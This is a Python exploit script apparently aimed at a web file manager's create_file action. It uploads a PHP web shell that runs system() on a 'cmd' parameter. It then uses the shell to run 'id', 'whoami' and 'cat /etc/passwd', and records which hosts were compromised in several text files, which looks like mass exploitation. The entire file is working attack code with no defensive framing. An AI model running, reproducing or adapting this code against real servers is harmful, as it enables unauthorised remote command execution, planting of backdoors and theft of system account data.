import sys
import requests
from bs4 import BeautifulSoup



def run_command(web_session, webshell_url, command_to_run):
    webshell_response = web_session.get(url = webshell_url + f"?cmd={command_to_run}", headers = headers)
    command_output_soup = BeautifulSoup(webshell_response.text, 'html.parser')
    return (webshell_response, command_output_soup.find('pre').text)


if __name__ == "__main__":
    
    host = sys.argv[1]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }

    target_url = f"http://{host}/filemanager/execute.php?action=create_file"

    payload = "<html><body><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?></pre></body></html>"
    
    cookie_url = f"http://{host}/filemanager/dialog.php"

    session = requests.Session()

    try:
        session.get(url = cookie_url, headers = headers)
    except:
        sys.exit(0)

    params = {"path": "headersweebshell.php", "path_thumb": "../thumbs/headersweebshell.php", "name": "shell.txt", "new_content": payload}

    response = session.post(url = target_url, headers = headers, data = params)
    print(response.text )

    # If the status code and the message match, we may have a webshell inside. ;)
    if response.status_code == 200 and response.text == "File successfully saved.":
        with open('4.txt', 'a') as file:
                file.write(host+'\n')
        file.close()
        # Default webshell path
        shell_url = f"http://{host}/source/headersweebshell.php"
        
        webshell_response = session.get(url = shell_url + f"?cmd=id", headers = headers)
        
        if ('uid=' in str(webshell_response.content, 'utf-8') and 'gid=' in str(webshell_response.content, 'utf-8')):
            with open('1.txt', 'a') as file:
                file.write(shell_url+'\n')
            file.close()
            
        if ('uid=0(root) gid=0(wheel)' in str(response.content, 'utf-8')):
            with open('2.txt', 'a') as file:
                file.write(shell_url+'\n')
            file.close()
        
        webshell, whoami_output = run_command(session, shell_url, "whoami")
        webshell, passwd_output = run_command(session, shell_url, "cat /etc/passwd")
        
        common_users = ["www-data", "apache", "nobody", "apache2", "root", "administrator", "admin"]

        # Verify if the command was executed correctly
        if webshell.status_code == 200 or whoami_output.lower() in common_users or "root:x::" in passwd_output:
            with open('3.txt', 'a') as file:
                file.write(shell_url+'\n')
            file.close()